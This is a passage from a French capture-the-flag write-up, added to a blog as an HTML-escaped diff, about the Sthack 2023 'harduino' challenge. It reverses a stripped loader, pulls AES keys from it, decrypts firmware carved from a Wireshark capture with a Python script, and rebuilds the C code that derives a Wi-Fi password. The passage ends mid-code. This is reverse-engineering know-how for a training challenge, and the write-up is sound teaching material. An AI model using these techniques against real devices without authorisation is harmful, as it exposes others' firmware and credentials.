+&lt;h2 id=&quot;page-github&quot;&gt;Page Github&lt;/h2&gt;
+
+&lt;p&gt;Nous allons donc étudier le repo github :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/github.png&quot; alt=&quot;github&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous observons 4 commits et une release. La release a pour titre “Closed source” cela signifie que les sources ne sont pas fournies et que seul un binaire est présent. Nous analysons donc l’historique des commits.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/commits.png&quot; alt=&quot;commits&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le premier commit contient du code en Rust qui a ensuite été supprimé lors du troisième commit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/first_commit.png&quot; alt=&quot;first_commit&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le premier commit contient donc un code effectuant une connexion TCP locale et envoyant un fichier binaire (ici &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/id&lt;/code&gt;) après l’avoir chiffré en AES 128. Des valeurs de clé et d’IV sont également fournies. Ces valeurs sont nécessaires au déchiffrement.&lt;/p&gt;
+
+&lt;p&gt;Nous récupérons également le fichier de release :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/release.png&quot; alt=&quot;release&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le fichier de release est appelé harduino_OTA. Dans le monde de l’électronique embarquée &lt;a href=&quot;&quot;&gt;&lt;/a&gt;OTA signifie &lt;em&gt;Over The Air&lt;/em&gt;, dans ce cas on parle d’OTA update ou mise à jour à distance. Le projet étant également nommé harduino_loader et un loader étant un système de chargement de programme pour microcontrôleur nous pouvons déduire que le code Rust vu précédemment est celui qui a généré ce binaire.&lt;/p&gt;
+
+&lt;p&gt;Nous vérifions le fichier récupéré :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file harduino_OTA
+harduino_OTA: ELF 64-bit LSB pie executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b37e83597ddd7e5c382d3fe3c847cb5dbc1e289f, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 4.4.0, stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Le fichier est bien un binaire Linux ELF x86. La valeur stripped à la fin indique que les symboles ne sont pas présents dans le fichier et qu’il a donc été compilé en mode release.&lt;/p&gt;
+
+&lt;h2 id=&quot;analyse-du-fichier-binaire&quot;&gt;Analyse du fichier binaire&lt;/h2&gt;
+
+&lt;p&gt;Nous analysons le fichier binaire dans binary-ninja.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/main.png&quot; alt=&quot;main&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La fonction main est très courte mais contient un appel vers la fonction sub_9c20 qui elle-même contient la logique du programme.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/sub_9c20.png&quot; alt=&quot;sub_9c20&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous retrouvons la logique de l’application avec le chargement du firmwarre harduino.&lt;/p&gt;
+
+&lt;p&gt;Pour mieux comprendre le code nous décidons de compiler le code trouvé dans l’historique des commits du répo github.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/notre_binaire.png&quot; alt=&quot;notrebinaire&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous retrouvons donc que la fonction appelée avant le chargement du fichier est celle d’initialisation du chiffrement et que la clé et l’IV sont concaténés.&lt;/p&gt;
+
+&lt;p&gt;Nous regardons donc les valeurs des champs data_45055 et data_45065:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/key_IV.png&quot; alt=&quot;key_IV&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous retrouvons donc les 32 bytes de données formant la clé et le vecteur d’initialisation du chiffrement.&lt;/p&gt;
+
+&lt;p&gt;Nous allons donc récupérer le firmware uploadé.&lt;/p&gt;
+
+&lt;h2 id=&quot;récupération-et-déchiffrement-du-firmware&quot;&gt;Récupération et déchiffrement du firmware&lt;/h2&gt;
+
+&lt;p&gt;De retour dans Wireshark nous cherchons la communication TCP locale sur le port 1337 comme indiqué dans le code trouvé. Une fois cet échange trouvé, nous récupérons le fichier en effectuant un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clic droit &amp;gt; Follow &amp;gt; TCP stream&lt;/code&gt; que nous affichons en raw.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/firmware.png&quot; alt=&quot;firmware_chiffré&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous copions le contenu ainsi récupéré dans un fichier et à l’aide d’un code Python et des clé et IV récupérés nous déchiffrons le binaire.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;my_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;87df86f0ba4e95dae94be985609f31a7&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6e3329c538cfca39ec3a0742273dad68&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;encryptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;my_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MODE_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;file_content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dump.raw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;firmware.bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous retrouvons bien un exécutable ARM dans le fichier firmware.bin&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file firmware.bin 
+firmware.bin: ELF 32-bit LSB executable, ARM, EABI5 version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, with debug_info, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous analysons alors le fichier récupéré.&lt;/p&gt;
+
+&lt;h2 id=&quot;analyse-du-firmware&quot;&gt;Analyse du firmware&lt;/h2&gt;
+
+&lt;p&gt;Le firmware n’est pas strippé donc les méthodes sont présentes :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/firmware_methods.png&quot; alt=&quot;firmware methods&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cela nous permet de nous rendre facilement dans la fonction setup qui initialise le microcontrôleur.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/firmware_create_Ap.png&quot; alt=&quot;firmware AP&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous retrouvons donc la fonction beginAP indiquant le SSID MyAccessPoint ainsi qu’un mot de passe. Cependant r1_8, la variable contenant le mot de passe au moment de la création de l’AP, a subi des modifications par rapport à la valeur vu dans le memcpy.&lt;/p&gt;
+
+&lt;p&gt;Nous récupérons donc le code C du dé-compilateur et remplaçons les méthodes Arduino par des méthodes C standard pour récupérer la clé une fois ces modifications effectuées.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 42&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cle_wifi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Z7cX_Ud-3A5E&apos;1m)=?cJU664&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cle_wifi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+          &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+          &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+              &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+              &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cle_wifi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+              &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+              &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+              &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cle_wifi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+              &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                  &lt;span class=&quot;n&quot;&gt;r3_9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                  &lt;span class=&quot;n&quot;&gt;r3_9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                  &lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+              &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_12&lt;/span&gt;&lt;span 